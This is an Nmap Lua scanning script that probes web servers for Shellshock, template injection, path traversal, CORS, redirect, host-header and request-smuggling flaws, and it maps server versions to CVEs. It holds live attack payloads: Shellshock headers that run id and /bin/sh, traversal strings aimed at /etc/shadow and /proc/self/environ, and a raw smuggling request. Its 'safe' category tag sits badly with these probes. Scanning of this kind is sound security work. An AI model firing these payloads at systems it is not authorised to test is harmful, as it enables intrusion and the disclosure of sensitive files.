local http       = require "http"
local shortport  = require "shortport"
local stdnse     = require "stdnse"
local vulns      = require "vulns"
local string     = require "string"
local table      = require "table"
local base64     = require "base64"
local url        = require "url"
local nmap       = require "nmap"

description = [[
Advanced HTTP vulnerability scanner covering Shellshock, SSTI, open redirect,
CORS misconfiguration, host header injection, HTTP request smuggling indicators,
clickjacking, security header analysis, path traversal, method tampering,
and server/framework fingerprinting with version-based CVE correlation.
]]

author     = "MatrixTM26"
license    = "Same as Nmap"
categories = {"vuln", "safe", "intrusive"}

portrule = shortport.http

local SECURITY_HEADERS = {
  ["strict-transport-security"]  = {sev="HIGH",   note="HSTS absent — SSL stripping possible"},
  ["content-security-policy"]    = {sev="MEDIUM",  note="CSP absent — XSS impact elevated"},
  ["x-frame-options"]            = {sev="MEDIUM",  note="Clickjacking protection missing"},
  ["x-content-type-options"]     = {sev="LOW",     note="MIME sniffing not blocked"},
  ["x-xss-protection"]           = {sev="LOW",     note="Legacy XSS filter not set"},
  ["referrer-policy"]            = {sev="LOW",     note="Referrer leakage possible"},
  ["permissions-policy"]         = {sev="LOW",     note="Feature policy undefined"},
  ["cross-origin-opener-policy"] = {sev="LOW",     note="Cross-origin isolation absent"},
  ["cross-origin-resource-policy"] = {sev="LOW",   note="CORP header missing"},
}

local TRAVERSAL_PAYLOADS = {
  "/etc/passwd",
  "/etc/shadow",
  "/proc/self/environ",
  "/proc/version",
  "/windows/win.ini",
  "/windows/system32/drivers/etc/hosts",
}

local TRAVERSAL_PREFIXES = {
  "../../../../..",
  "../../../..",
  "../../..",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
  "..%2F..%2F..%2F",
  "%252e%252e%252f",
  "....//....//....//",
}

local TRAVERSAL_SIGNATURES = {
  "root:x:0:0", "root:.*:.*:.*:/root",
  "\\[fonts\\]", "for 16-bit app support",
  "Linux version",
}

local SHELLSHOCK_PATHS = {
  "/cgi-bin/test.cgi",   "/cgi-bin/status",    "/cgi-bin/admin.cgi",
  "/cgi-bin/info.cgi",   "/cgi-bin/printenv",  "/cgi-bin/env.cgi",
  "/cgi-sys/defaultwebpage.cgi",               "/cgi-mod/index.cgi",
}

local SSTI_PAYLOADS = {
  {marker = "{{7*7}}",         expect = "49",     engine = "Jinja2/Twig"},
  {marker = "${7*7}",          expect = "49",     engine = "Freemarker/EL"},
  {marker = "<%= 7*7 %>",      expect = "49",     engine = "ERB/JSP"},
  {marker = "#{7*7}",          expect = "49",     engine = "Ruby/Pebble"},
  {marker = "*{7*7}",          expect = "49",     engine = "Thymeleaf"},
  {marker = "{{7*'7'}}",       expect = "7777777",engine = "Jinja2"},
}

local CORS_ORIGINS = {
  "https://evil.com",
  "null",
  "https://target.evil.com",
}

local SERVER_CVE_MAP = {
  ["Apache/2.4.49"]  = {cve="CVE-2021-41773", desc="Path traversal & RCE"},
  ["Apache/2.4.50"]  = {cve="CVE-2021-42013", desc="Path traversal & RCE (bypass)"},
  ["nginx/1.3.9"]    = {cve="CVE-2013-2028",  desc="Stack buffer overflow"},
  ["nginx/1.4.0"]    = {cve="CVE-2013-2028",  desc="Stack buffer overflow"},
  ["IIS/6.0"]        = {cve="CVE-2017-7269",  desc="WebDAV ScStoragePathFromUrl overflow"},
  ["IIS/7.5"]        = {cve="CVE-2010-1256",  desc="IIS auth bypass"},
  ["Jetty/9.4.3"]    = {cve="CVE-2017-9735",  desc="Directory traversal"},
  ["Tomcat/9.0.0"]   = {cve="CVE-2020-1938",  desc="Ghostcat AJP file read"},
}

local function get_with_timeout(host, port, path, opts)
  local options = opts or {}
  options.timeout = options.timeout or 8000
  options.redirect_ok = options.redirect_ok or false
  return http.get(host, port, path, options)
end

local function match_any(body, patterns)
  for _, pat in ipairs(patterns) do
    if string.find(body, pat) then return pat end
  end
  return nil
end

local function test_shellshock(host, port)
  local shellshock_hdr = {
    ["User-Agent"] = "() { ignored; }; echo Content-Type: text/plain; echo; id; uname -a",
    ["Cookie"]     = "() { ignored; }; echo; /usr/bin/id",
    ["Referer"]    = "() { ignored; }; echo; /bin/sh -c id",
  }
  for _, path in ipairs(SHELLSHOCK_PATHS) do
    local r = get_with_timeout(host, port, path, {header = shellshock_hdr})
    if r and r.body then
      if string.find(r.body, "uid=%d") or
         string.find(r.body, "Linux") or
         string.find(r.body, "root") then
        return true, path
      end
    end
  end
  return false, nil
end

local function test_ssti(host, port)
  local test_paths = {"/search", "/", "/index.php", "/app", "/q"}
  local params     = {"q", "search", "query", "s", "input", "name", "id"}
  for _, path in ipairs(test_paths) do
    for _, param in ipairs(params) do
      for _, payload in ipairs(SSTI_PAYLOADS) do
        local full_path = path .. "?" .. param .. "=" .. url.escape(payload.marker)
        local r = get_with_timeout(host, port, full_path)
        if r and r.body and string.find(r.body, payload.expect, 1, true) then
          return true, {
            path    = full_path,
            engine  = payload.engine,
            payload = payload.marker,
            param   = param,
          }
        end
      end
    end
  end
  return false, nil
end

local function test_traversal(host, port)
  for _, prefix in ipairs(TRAVERSAL_PREFIXES) do
    for _, target in ipairs(TRAVERSAL_PAYLOADS) do
      local path = "/" .. prefix .. target
      local r    = get_with_timeout(host, port, path)
      if r and r.body then
        local match = match_any(r.body, TRAVERSAL_SIGNATURES)
        if match then
          return true, {path = path, matched = match}
        end
      end
    end
  end
  return false, nil
end

local function test_cors(host, port)
  local findings = {}
  for _, origin in ipairs(CORS_ORIGINS) do
    local r = get_with_timeout(host, port, "/", {
      header = {["Origin"] = origin}
    })
    if r and r.header then
      local acao = r.header["access-control-allow-origin"]
      local acac = r.header["access-control-allow-credentials"]
      if acao then
        if acao == "*" and acac == "true" then
          table.insert(findings, {
            severity = "CRITICAL",
            origin   = origin,
            acao     = acao,
            acac     = acac,
            note     = "Wildcard ACAO + credentials=true — credential theft possible",
          })
        elseif acao == origin or acao == "null" then
          table.insert(findings, {
            severity = acac == "true" and "HIGH" or "MEDIUM",
            origin   = origin,
            acao     = acao,
            acac     = acac or "false",
            note     = "Reflected origin in ACAO",
          })
        end
      end
    end
  end
  return findings
end

local function test_host_header_injection(host, port)
  local payloads = {
    "evil.com",
    "evil.com:80",
    "localhost",
    host.ip .. ":8080@evil.com",
  }
  for _, payload in ipairs(payloads) do
    local r = http.get(host, port, "/", {
      header  = {["Host"] = payload},
      timeout = 6000,
      redirect_ok = false,
    })
    if r then
      if r.status == 301 or r.status == 302 then
        local loc = r.header["location"] or ""
        if string.find(loc, "evil.com") then
          return true, {payload = payload, location = loc}
        end
      end
      if r.body and string.find(r.body, "evil.com") then
        return true, {payload = payload, reflected = true}
      end
    end
  end
  return false, nil
end

local function test_open_redirect(host, port)
  local params = {"url", "next", "redirect", "return", "returnUrl", "goto", "dest", "target", "redir"}
  local test_url = "https://evil.com/pwned"
  local paths    = {"/", "/login", "/logout", "/redirect", "/go"}
  for _, path in ipairs(paths) do
    for _, param in ipairs(params) do
      local r = get_with_timeout(host, port, path .. "?" .. param .. "=" .. url.escape(test_url), {
        redirect_ok = false
      })
      if r and (r.status == 301 or r.status == 302) then
        local loc = r.header["location"] or ""
        if string.find(loc, "evil.com") then
          return true, {param = param, path = path, location = loc}
        end
      end
    end
  end
  return false, nil
end

local function test_method_tampering(host, port)
  local dangerous = {"PUT", "DELETE", "TRACE", "TRACK", "CONNECT", "PATCH", "PROPFIND", "MKCOL"}
  local allowed   = {}
  local r = http.generic_request(host, port, "OPTIONS", "/", {timeout = 6000})
  if r and r.header then
    local allow_hdr = r.header["allow"] or r.header["public"] or ""
    for _, method in ipairs(dangerous) do
      if string.find(string.upper(allow_hdr), method) then
        table.insert(allowed, method)
      end
    end
    local trace_r = http.generic_request(host, port, "TRACE", "/", {timeout = 6000})
    if trace_r and trace_r.status == 200 and trace_r.body then
      if string.find(trace_r.body, "TRACE") then
        table.insert(allowed, "TRACE (XST confirmed)")
      end
    end
  end
  return allowed
end

local function fingerprint_server(host, port)
  local r = get_with_timeout(host, port, "/")
  if not r or not r.header then return nil end
  local server  = r.header["server"] or ""
  local powered = r.header["x-powered-by"] or ""
  local result  = {server = server, powered = powered, cve = nil}
  for pattern, cve_info in pairs(SERVER_CVE_MAP) do
    if string.find(server, pattern, 1, true) then
      result.cve = cve_info
      break
    end
  end
  return result
end

local function check_security_headers(host, port)
  local r       = get_with_timeout(host, port, "/")
  local missing = {}
  if not r or not r.header then return missing end
  for header, info in pairs(SECURITY_HEADERS) do
    if not r.header[header] then
      table.insert(missing, {header = header, severity = info.sev, note = info.note})
    end
  end
  return missing
end

local function test_smuggling_indicator(host, port)
  local payload = "POST / HTTP/1.1\r\n"
                .. "Host: " .. host.ip .. "\r\n"
                .. "Content-Length: 6\r\n"
                .. "Transfer-Encoding: chunked\r\n"
                .. "Connection: keep-alive\r\n\r\n"
                .. "0\r\n\r\n"
                .. "G"
  local sock = nmap.new_socket()
  sock:set_timeout(6000)
  local ok = sock:connect(host.ip, port.number, "tcp")
  if not ok then return false end
  sock:send(payload)
  local status, resp = sock:receive_bytes(12)
  sock:close()
  if status and resp then
    if string.find(resp, "HTTP/1") then
      local code = string.match(resp, "HTTP/%d%.%d (%d+)")
      return code ~= nil and code ~= "400", code
    end
  end
  return false, nil
end

action = function(host, port)
  local report  = vulns.Report:new(SCRIPT_NAME, host, port)
  local output  = stdnse.output_table()
  local results = {}

  local fp = fingerprint_server(host, port)
  if fp then
    table.insert(results, string.format("[INFO] Server: %s | X-Powered-By: %s",
      fp.server ~= "" and fp.server or "Hidden",
      fp.powered ~= "" and fp.powered or "None"))
    if fp.cve then
      table.insert(results, string.format("[CRITICAL] Known CVE for server version — %s: %s",
        fp.cve.cve, fp.cve.desc))
    end
  end

  local ss_ok, ss_path = test_shellshock(host, port)
  if ss_ok then
    table.insert(results, string.format("[CRITICAL] Shellshock (CVE-2014-6271) at %s — RCE confirmed", ss_path))
    report:add_vulns({
      id    = "CVE-2014-6271",
      title = "Shellshock Remote Code Execution",
      state = vulns.State.VULN,
      scores = {cvss = 10.0},
    })
  end

  local ssti_ok, ssti = test_ssti(host, port)
  if ssti_ok and ssti then
    table.insert(results, string.format(
      "[CRITICAL] SSTI confirmed — engine: %s | param: %s | path: %s",
      ssti.engine, ssti.param, ssti.path))
  end

  local trav_ok, trav = test_traversal(host, port)
  if trav_ok and trav then
    table.insert(results, string.format(
      "[CRITICAL] Path traversal confirmed at: %s (matched: %s)", trav.path, trav.matched))
    report:add_vulns({
      id    = "PATH-TRAVERSAL",
      title = "Directory/Path Traversal",
      state = vulns.State.VULN,
      scores = {cvss = 7.5},
    })
  end

  local cors_findings = test_cors(host, port)
  for _, cf in ipairs(cors_findings) do
    table.insert(results, string.format(
      "[%s] CORS misconfiguration — ACAO: %s | credentials: %s | %s",
      cf.severity, cf.acao, cf.acac, cf.note))
  end

  local hhi_ok, hhi = test_host_header_injection(host, port)
  if hhi_ok and hhi then
    table.insert(results, string.format(
      "[HIGH] Host header injection — payload: %s | %s",
      hhi.payload, hhi.location or "reflected in body"))
  end

  local redir_ok, redir = test_open_redirect(host, port)
  if redir_ok and redir then
    table.insert(results, string.format(
      "[HIGH] Open redirect — param: %s at %s -> %s",
      redir.param, redir.path, redir.location))
  end

  local dangerous_methods = test_method_tampering(host, port)
  if #dangerous_methods > 0 then
    table.insert(results, "[MEDIUM] Dangerous HTTP methods: " .. table.concat(dangerous_methods, ", "))
  end

  local smuggle_ok, smuggle_code = test_smuggling_indicator(host, port)
  if smuggle_ok then
    table.insert(results, string.format(
      "[HIGH] HTTP request smuggling indicator — server accepted ambiguous framing (status %s)",
      tostring(smuggle_code)))
  end

  local missing_headers = check_security_headers(host, port)
  if #missing_headers > 0 then
    table.insert(results, string.format("[INFO] %d security header(s) missing:", #missing_headers))
    for _, h in ipairs(missing_headers) do
      table.insert(results, string.format("  [%s] %s — %s", h.severity, h.header, h.note))
    end
  end

  if #results == 0 then
    table.insert(results, "[OK] No critical vulnerabilities identified")
  end

  output["Vulnerabilities"] = results
  return output, report:make_output()
end
